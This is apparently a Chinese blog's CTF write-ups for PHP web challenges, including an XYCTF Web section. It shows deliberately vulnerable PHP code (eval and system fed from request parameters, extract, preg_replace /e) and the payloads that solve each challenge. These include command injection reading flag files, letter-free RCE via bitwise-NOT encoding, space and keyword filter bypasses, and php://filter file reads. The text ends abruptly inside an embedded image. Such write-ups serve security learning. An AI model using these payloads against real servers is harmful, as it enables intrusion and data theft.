class="variable">$c</span>=<span class="string">&quot;woyaoxueweb&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;caijiuduolian&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;cai&#x27;</span>]==<span class="string">&quot;will&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>!=<span class="variable">$b</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))</span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)==<span class="number">12</span>&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/I_want_flag_/&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;jiuchayidiandian!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;cai,o!&quot;</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$id</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">cai,o! nulijiuhui</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=caijiuduolian&amp;json=&#123;<span class="string">&quot;cai&quot;</span>:<span class="string">&quot;will&quot;</span>&#125;&amp;c=I_want_flag_</span><br><span class="line"><span class="comment">//json语法，json对象是一种存储数据的方式，它使用键值对的形式表示数据</span></span><br><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>flag{Easy^<em>php_isn’t!!!</em>}</p><h3 id="php来咯"><a href="#php来咯" class="headerlink" title="php来咯"></a>php来咯</h3><h4 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span><span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;have a try~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> have a <span class="keyword">try</span>~</span><br></pre></td></tr></table></figure><p>利用 SplFileObject 配合php伪协议 读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?md5=0e00275209979</span><br><span class="line">c=SplFileObject&amp;d=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">ssdxgy_xyz_xy.php --&gt;第二关：</span><br></pre></td></tr></table></figure><h4 id="ssdxgy-xyz-xy-php"><a href="#ssdxgy-xyz-xy-php" class="headerlink" title="ssdxgy_xyz_xy.php"></a>ssdxgy_xyz_xy.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;try,try&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;try,try,try&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">try</span>,<span class="keyword">try</span>,<span class="keyword">try</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?json=&#123;<span class="string">&quot;x&quot;</span>:<span class="string">&quot;wllm&quot;</span>&#125;&amp;url=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /fllll1laggg.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">id=wllmNB</span><br></pre></td></tr></table></figure><p>flag{Th2s_@a_TesT23_fll1llag}</p><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,]; </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;菜鸡说你的符号不行哦！&quot;</span>); </span><br><span class="line">    &#125;&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))   </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你觉得能使用字母嘛！&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;xbjscj说：你做的很好，但还差一点点哟&quot;</span>; </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;小伙子要注意审题哦！！！&quot;</span>;</span><br><span class="line">&#125; 小伙子要注意审题哦！！！</span><br></pre></td></tr></table></figure><p>无字母rce 取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">93</span>%<span class="number">8</span>C%DF%D0);  ==&gt;  bin boot dev etc fllll1laggg.php home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="keyword">var</span> </span><br><span class="line"><span class="comment">//system(&quot;ls /&quot;);</span></span><br><span class="line">?wllm=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%CE%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F);</span><br><span class="line"><span class="comment">//system(&quot;cat /fllll1laggg.php&quot;);</span></span><br><span class="line">flag&#123;Th1s_@a_TesT_fll1llag&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="水果忍者"><a href="#水果忍者" class="headerlink" title="水果忍者"></a>水果忍者</h3><p>一个游戏，在js代码里面找相应的base64字符解码就行</p><p>将”无敌火影大王“base64编码后就是flag啦格式flag{转换后的编码}</p><p>if(a&#x3D;&#x3D;md5(a)) 满足这个条件的值+上面内容一起才是真正的flag，格式为flag{上面那个+满足的值}<br>（这题应该是有问题的，毕竟满足这样条件的a是有很多个来着，题目应该出错了）</p><p>a&#x3D;0e00275209979</p><h3 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>写的时候就是卡这题了，忘记他没过滤ls，审题不仔细<br>然后就是字符拼接也卡到了，本来是想着通过 (c.a.t) 拼接的，但没有成功，感觉应该是可以的吧<br>确实也没想到可以用 <code>$@</code> 进行拼接，也是学到了 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cd%<span class="number">09</span>..%<span class="number">26</span>%<span class="number">26</span>cd%<span class="number">09</span>..%<span class="number">26</span>%<span class="number">26</span>cd%<span class="number">09</span>..%<span class="number">26</span>%<span class="number">26</span>t$@ac%<span class="number">09</span>ffff$@llllagggg;</span><br><span class="line">%<span class="number">09</span>--&gt;绕过空格</span><br><span class="line">t$@ac ==&gt; tac  $@绕过tac，用于字符拼接</span><br><span class="line">%<span class="number">26</span>%<span class="number">26</span>  --&gt;  &amp;&amp; 可以用于连接多个命令，使得前一个命令成功执行后才执行下一个命令;</span><br></pre></td></tr></table></figure><p>flag{12312hjghfghfghfdgd} </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF--Web</title>
      <link href="/2024/05/18/XYCTF/"/>
      <url>/2024/05/18/XYCTF/</url>
      
        <content type="html"><![CDATA[<p>有些是比赛的时候写的，有些是赛后看wp复现的</p><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>md5($_GET[&#39;val1&#39;]) == md5($_GET[&#39;val2&#39;]))</code>     :    md5弱比较，数组绕过<br>$md5 &#x3D;&#x3D; md5($md5)  :   双md5<br>extract() : 可以变量覆盖<br>XYCTF_550102591  ： md5值为 0e937920457786991080577371025051<br>s1502113478a：md5值为  0e861580163291561247404381396064</p><p>GET 传参：<br>?val1[]&#x3D;1&amp;val2[]&#x3D;2&amp;md5&#x3D;0e00275209979&amp;XY&#x3D;s1502113478a&amp;XYCTF&#x3D;s1502113478a</p><p>到第二关   LLeeevvveeelll222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>intval参数如果是有内容的数组返回1<br>post 传参：  a[]&#x3D;1</p><p>preg_replace的RCE：&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码</p><p>?a&#x3D;&#x2F;test&#x2F;e&amp;b&#x3D;system(“cat &#x2F;flag”)&amp;c&#x3D;just test<br> 直接得到flag  : XYCTF{0b8c5ae7-22e3-4ef2-9d4a-d48d5a461c7c}</p><h3 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h3><p>语法问题：<br><code>echo $(shell cat f*)</code><br> 或者<br><code>$(shell cat f*)</code><br><img src="/2024/05/18/XYCTF/Image(4).png" alt="38ad9be863834e2b351b7dce2da4ed66.png"><img src="data:image/png;base64,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